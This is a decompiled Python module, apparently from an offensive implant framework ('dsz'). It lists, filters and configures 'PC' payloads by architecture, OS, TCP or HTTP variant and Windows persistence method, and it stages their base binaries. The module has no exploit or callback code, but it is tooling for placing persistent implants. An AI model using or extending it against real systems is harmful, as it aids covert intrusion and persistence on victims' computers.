# uncompyle6 version 2.9.10
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.10 (default, Feb  6 2017, 23:53:20) 
# [GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)]
# Embedded file name: __init__.py
import dsz
import pc.payload.config
import pc.payload.exe
import dsz.lp
import dsz.path
import glob
import os
import shutil
import xml.dom.minidom
FinalizedBinaryField = 'File'
PayloadFields = ['Description', 'Name', 'ShortName', 'Arch', 'Os', 'BinType', 'Type', 'Persistence', FinalizedBinaryField]
PersistenceTypes = ['utilityburst', 'appcompat', 'winsockhelperapi', 'generic']

def CreateConfigDir(info):
    payloadDir = dsz.lp.GetLogsDirectory() + '/Payloads'
    try:
        os.mkdir(payloadDir)
    except:
        pass

    dirPath = payloadDir + '/%s_%s' % (info['Name'], dsz.Timestamp())
    os.mkdir(dirPath)
    file = dsz.path.Split(info[FinalizedBinaryField])[1]
    shutil.copy(os.path.join(dsz.lp.GetResourcesDirectory(), info['ShortName'], info[FinalizedBinaryField]), os.path.join(dirPath, file + '.base'))
    return (
     dirPath, file)


def GetConfigured(params, callbackFunc=None):
    dirs = list()
    for adir in glob.glob(dsz.lp.GetLogsDirectory() + '\\Payloads\\*'):
        try:
            if not _IsValid(params, _getDom(adir)):
                continue
        except IOError:
            continue
        except Exception as e:
            dsz.ui.Echo('Exception parsing payload_info in ' + adir + '\n' + str(e), dsz.WARNING)
            continue

        if callbackFunc != None:
            if not callbackFunc(params, adir):
                continue
        dirs.append(adir)

    return dirs


def GetInfo(payloadDir):
    info = {}
    dom = _getDom(payloadDir)
    for key in PayloadFields:
        info[key] = _getElementText(dom, key)

    if info == {}:
        info = None
    return info


def PickForPrep(params):
    allFiles = glob.glob(dsz.lp.GetResourcesDirectory() + 'Pc\\Payloads\\*\\payload_*.xml')
    if len(allFiles) == 0:
        dsz.ui.Echo('* Failed to find any payloads for PC', dsz.ERROR)
        return None
    else:
        valid = list()
        for f in allFiles:
            try:
                dom1 = xml.dom.minidom.parse(f)
                for node in dom1.getElementsByTagName('Payload'):
                    info = _getPayloadInfo(node)
                    if _IsValid(params, info):
                        valid.append(info)

            except Exception as e:
                dsz.ui.Echo('Exception parsing ' + f + '\n' + str(e), dsz.WARNING)

        dsz.ui.Echo('Possible payloads:')
        dsz.ui.Echo('     0) - Quit')
        for i, info in enumerate(valid, 1):
            dsz.ui.Echo('    %2u) - %s (%s-%s %s %s)' % (i, info['Description'], info['Arch'], info['Os'], info['Type'], info['BinType']))

        if len(valid) == 1:
            dsz.ui.Echo('* Fully specific parameters, autoselecting choice #1.', dsz.GOOD)
            return valid[0]
        while True:
            choice = dsz.ui.GetInt('Pick the payload type')
            if choice == 0:
                return None
            if choice < 0 or choice > len(valid):
                dsz.ui.Echo('* Invalid choice', dsz.ERROR)
            else:
                return valid[choice - 1]

        return None


def StoreInfo(payloadInfo, path, finalBinary):
    infoLines = list()
    infoLines.append("<?xml version='1.0' encoding='UTF-8' ?>\n")
    infoLines.append('<Payload>\n')
    addLines = lambda k, v: infoLines.append('    <%s>%s</%s>\n' % (k, v, k))
    for key in PayloadFields:
        if key == FinalizedBinaryField:
            addLines(key, '\\'.join(finalBinary.split('/')))
        else:
            addLines(key, payloadInfo[key])

    for key, value in payloadInfo['Extra'].items():
        addLines(key, value)

    infoLines.append('</Payload>\n')
    fileName = path + '/payload_info.xml'
    try:
        with open(fileName, 'w') as f:
            f.writelines(infoLines)
    except:
        dsz.ui.Echo('* Failed to write configuration file', dsz.ERROR)
        return ''

    return fileName


def _getDom(payloadDir):
    return xml.dom.minidom.parse(payloadDir + '/payload_info.xml')


def _getNodeText(element):
    txt = ''
    for node in element.childNodes:
        if node.nodeType == node.TEXT_NODE:
            txt += node.data

    return txt


def _getPayloadInfo(payloadNode):
    info = {'Extra': {}}
    for key in PayloadFields:
        if key == FinalizedBinaryField:
            txt = _getElementTextSafe(payloadNode, 'BaseFile')
        else:
            txt = _getElementTextSafe(payloadNode, key)
        info[key] = txt

    try:
        extraNodeList = payloadNode.getElementsByTagName('Extra')
        for extra in extraNodeList:
            txt = _getNodeText(extra)
            key = extra.getAttribute('name')
            if key != '':
                info['Extra'][key] = txt

    except:
        dsz.ui.Echo("Exception parsing 'Extra' nodes in payload", dsz.WARNING)

    return info


def _getElementText(obj, name):
    return _getNodeText(obj.getElementsByTagName(name)[0])


def _getElementTextSafe(topNode, name):
    try:
        return _getElementText(topNode, name)
    except:
        return ''


def _IsValid(params, info):
    if type(info) == dict:
        valueFunc = lambda x: info[x]
    else:
        valueFunc = lambda x: _getElementTextSafe(info, x)
    for key in ['Arch', 'Os', 'BinType', 'Type']:
        if params.has_key(key.lower()):
            if params[key.lower()][0].lower() != valueFunc(key).lower():
                return False

    for persistenceType in PersistenceTypes:
        if params.has_key(persistenceType):
            if persistenceType.lower() != valueFunc('Persistence').lower():
                return False

    if params.has_key('tcp'):
        if 'tcp' not in valueFunc('Description').lower():
            return False
    if params.has_key('http'):
        if 'http' not in valueFunc('Description').lower():
            return False
    if params.has_key('debug'):
        if 'debug' not in valueFunc('Description').lower():
            return False
    if params.has_key('release'):
        if 'debug' in valueFunc('Description').lower():
            return False
    if params.has_key('extra'):
        extraInfo = params['extra'][0].split('=', 1)
        if len(extraInfo) == 2:
            pivot = valueFunc('Extra')
            if type(pivot) == dict:
                if not pivot.has_key(extraInfo[0]) or extraInfo[1].lower() != pivot[extraInfo[0]].lower():
                    return False
            elif extraInfo[1].lower() != valueFunc(extraInfo[0]).lower():
                return False
    return True